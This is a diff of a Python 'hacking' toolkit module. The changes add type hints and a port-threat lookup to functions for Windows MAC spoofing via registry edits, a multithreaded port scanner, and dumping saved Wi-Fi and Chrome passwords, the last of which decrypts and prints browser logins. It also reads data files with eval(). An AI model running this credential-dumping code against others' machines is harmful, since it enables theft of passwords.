@@ -1,5 +1,6 @@
 import string
 import subprocess
+from re import Pattern
 
 import regex as re
 import os
@@ -9,6 +10,7 @@ from colorama import init as colorama_init, Fore
 from pydantic import AnyHttpUrl
 from requests_html import HTMLSession, MaxRetries
 from tqdm import tqdm
+from typing import Iterable
 
 colorama_init()
 
@@ -33,14 +35,13 @@ def get_random_mac() -> str:
 	# get the hexdigits uppercased
 	uppercased_hexdigits = ''.join(set(string.hexdigits.upper()))
 	# 2nd character must be 2, 4, A, or E
-	return random.choice(uppercased_hexdigits) + random.choice("24AE") + "".join(
-		random.sample(uppercased_hexdigits, k=10))
+	return random.choice(uppercased_hexdigits) + random.choice("24AE") + "".join(random.sample(uppercased_hexdigits, k=10))
 
 
 def randomize_mac_address():
-	network_interface_reg_path = r"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}"
-	transport_name_regex = re.compile("{.+}")
-	mac_regex = re.compile(r"([A-Z0-9]{2}[:-]){5}([A-Z0-9]{2})")
+	network_interface_reg_path: str = r"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}"
+	transport_name_regex: Pattern = re.compile("{.+}")
+	mac_regex: Pattern = re.compile(r"([A-Z0-9]{2}[:-]){5}([A-Z0-9]{2})")
 
 	def clean_mac(mac: str) -> str:
 		"""Simple function to clean non-hexadecimal characters from a MAC address
@@ -81,18 +82,18 @@ def randomize_mac_address():
 
 	def change_mac_address(adapter_transport_name, new_mac_address):
 		# use reg QUERY command to get available adapters from the registry
-		output = subprocess.check_output(f"reg QUERY " + network_interface_reg_path.replace("\\\\", "\\")).decode()
+		output: str = subprocess.check_output(f"reg QUERY " + network_interface_reg_path.replace("\\\\", "\\")).decode()
+		
 		for interface in re.findall(rf"{network_interface_reg_path}\\\d+", output):
 			# get the adapter index
 			adapter_index = int(interface.split("\\")[-1])
-			interface_content = subprocess.check_output(f"reg QUERY {interface.strip()}").decode()
+			interface_content: str = subprocess.check_output(f"reg QUERY {interface.strip()}").decode()
 
 			if adapter_transport_name in interface_content:
 				# if the transport name of the adapter is found on the output of the reg QUERY command
 				# then this is the adapter we're looking for
 				# change the MAC address using reg ADD command
-				changing_mac_output = subprocess.check_output(
-					f"reg add {interface} /v NetworkAddress /d {new_mac_address} /f").decode()
+				changing_mac_output = subprocess.check_output(f"reg add {interface} /v NetworkAddress /d {new_mac_address} /f").decode()
 				# print the command output
 				print(changing_mac_output)
 				# break out of the loop as we're done
@@ -102,51 +103,63 @@ def randomize_mac_address():
 
 	def disable_adapter(adapter_index: int) -> str:
 		# use wmic command to disable our adapter so the MAC address change is reflected
-		disable_output = subprocess.check_output(
-			f"wmic path win32_networkadapter where index={adapter_index} call disable").decode()
-		return disable_output
+		return subprocess.check_output(f"wmic path win32_networkadapter where index={adapter_index} call disable").decode()
 
 	def enable_adapter(adapter_index: int) -> str:
 		# use wmic command to enable our adapter so the MAC address change is reflected
-		enable_output = subprocess.check_output(
-			f"wmic path win32_networkadapter where index={adapter_index} call enable").decode()
-		return enable_output
+		return subprocess.check_output(f"wmic path win32_networkadapter where index={adapter_index} call enable").decode()
 
-	if input('do you want to randomize mac? '):
+	if input('do you want to randomize mac? (y/n)').lower() == 'y':
 		new_mac_address = get_random_mac()
+	else:
+		new_mac_address = input('enter new mac: ')
 
-	connected_adapters_mac = get_connected_adapters_mac_address()
+	connected_adapters_mac: list[tuple] = get_connected_adapters_mac_address()
 	old_mac_address, target_transport_name = get_user_adapter_choice(connected_adapters_mac)
 
 	print("[*] Old MAC address:", old_mac_address)
+	
 	adapter_index = change_mac_address(target_transport_name, new_mac_address)
 	print("[+] Changed to:", new_mac_address)
+	
 	disable_adapter(adapter_index)
 	print("[+] Adapter is disabled")
+	
 	enable_adapter(adapter_index)
 	print("[+] Adapter is enabled again")
 
 
-def _print_port_info(port: int):
-	with open("./hacking/sources/ports_info.txt", 'rt', encoding='windows-1251') as f:
+def print_port_info(port: int) -> None:
+	if port not in range(0, 65537):
+		print(f'{RED}Not a port!{RESET}')
+		return
+	
+	with open("./hacking/sources/ports_info.dat", 'rt', encoding='windows-1251') as f:
 		ports_info = eval(f.read())
+	with open("./hacking/sources/ports_threat.dat", 'rt', encoding='windows-1251') as f:
+		ports_threat_info = eval(f.read())
 
 	ports: list[int] = [i[0] for i in ports_info]
 	info: list[str] = [i[1] for i in ports_info]
+	ports_threat: list[int] = [i[0] for i in ports_threat_info]
+	info_threat: list[str] = [i[1] for i in ports_threat_info]
 
 	indexes: list[int] = [i for i, x in enumerate(ports) if x == port]
+	indexes_threat: list[int] = [i for i, x in enumerate(ports_threat) if x == port]
 
 	print(f'Information about port {GREEN}{port}{RESET}:')
 
-	if not indexes:
+	if not indexes and not indexes_threat:
 		print(f'{RED}No information!{RESET}')
 		return
-
+	
 	for i in indexes:
 		print('-', info[i])
+	for i in indexes:
+		print(f'-{RED}', info_threat[i], RESET)
 
 
-def port_scan(host: str):
+def port_scan(host: str) -> set[int]:
 	from queue import Queue
 	from threading import Thread, Lock
 	import socket
@@ -155,20 +168,24 @@ def port_scan(host: str):
 	t0: float = time()
 
 	N_THREADS: int = 1000
-	q: Queue = Queue()
+	q: Queue[int] = Queue()
 	print_lock: Lock = Lock()
 
 	# parse_wiki()
-
-	with open("./hacking/sources/ports_info.txt", 'rt', encoding='windows-1251') as f:
+	
+	with open("./hacking/sources/ports_info.dat", 'rt', encoding='windows-1251') as f:
 		ports_info = eval(f.read())
-
+	with open("./hacking/sources/ports_threat.dat", 'rt', encoding='windows-1251') as f:
+		ports_threat_info = eval(f.read())
+	
 	ports: list[int] = [i[0] for i in ports_info]
 	info: list[str] = [i[1] for i in ports_info]
-
+	ports_threat: list[int] = [i[0] for i in ports_threat_info]
+	info_threat: list[str] = [i[1] for i in ports_threat_info]
+	
 	opened: set[int] = set()
 
-	def scan_port(port):
+	def scan_port(host: str, port: int):
 		s = socket.socket()
 		try:
 			s.connect((host, port))
@@ -180,15 +197,15 @@ def port_scan(host: str):
 		finally:
 			s.close()
 
-	def scan_thread():
+	def scan_thread(host: str):
 		while True:
 			worker = q.get()
-			scan_port(worker)
+			scan_port(host, worker)
 			q.task_done()
 
-	def main(host, ports):
+	def main(host: str, ports: Iterable[int]):
 		for t in tqdm(range(N_THREADS)):
-			t = Thread(target=scan_thread)
+			t = Thread(target=scan_thread, args=(host,))
 			t.daemon = True
 			t.start()
 
@@ -199,20 +216,29 @@ def port_scan(host: str):
 
 	main(host, ports)
 	t1: float = time()
-
+	
 	for port in sorted(opened):
 		with print_lock:
 			indexes: list[int] = [i for i, x in enumerate(ports) if x == port]
-
+			indexes_threat: list[int] = [i for i, x in enumerate(ports_threat) if x == port]
+			
+			if not indexes and not indexes_threat:
+				print(f'{RED}No information!{RESET}')
+				continue
+			
 			print(f"\r{GREEN}{host:15}:{port:5} is opened {RESET}- {info[indexes[0]]}")
-
+			
 			for index in indexes[1:]:
 				print(' ' * (len(f"\r{GREEN}{host:15}:{port:5} is opened {RESET}") - 11), end='')
 				print('-', info[index])
+			for index in indexes_threat:
+				print(' ' * 31, f'-{RED}', info_threat[index], RESET)
 
 	print(f'finished (found {len(opened)} opened ports)')
 
 	print(f'{round(t1 - t0, 4)} s')
+	
+	return opened
 
 
 def saved_wifi_passwords() -> None:
@@ -283,7 +309,7 @@ def saved_chrome_passwords() -> None:
 	import shutil
 	from datetime import datetime, timedelta
 
-	def get_chrome_datetime(chromedate):
+	def get_chrome_datetime(chromedate) -> datetime:
 		"""Return a `datetime.datetime` object from a chrome format datetime
 		Since `chromedate` is formatted as the number of microseconds since January 1601"""
 		return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
@@ -303,7 +329,7 @@ def saved_chrome_passwords() -> None:
 		# doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
 		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
-	def decrypt_password(password, key):
+	def decrypt_password(password, key) -> str:
 		try:
 			iv = password[3:15]
 			password = password[15:]
@@ -328,12 +354,8 @@ def saved_chrome_passwords() -> None:
 	cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
 
 	for row in cursor.fetchall():
-		origin_url = row[0]
-		action_url = row[1]
-		username = row[2]
+		origin_url, action_url, username, _, date_created, date_last_used = row
 		password = decrypt_password(row[3], key)
-		date_created = row[4]
-		date_last_used = row[5]
 
 		if username or password:
 			print(f"Origin URL: {origin_url}")
@@ -352,6 +374,7 @@ def saved_chrome_passwords() -> None:
 
 	cursor.close()
 	db.close()
+	
 	try:
 		os.remove(filename)
 	except (IsADirectoryError, FileNotFoundError, OSError):
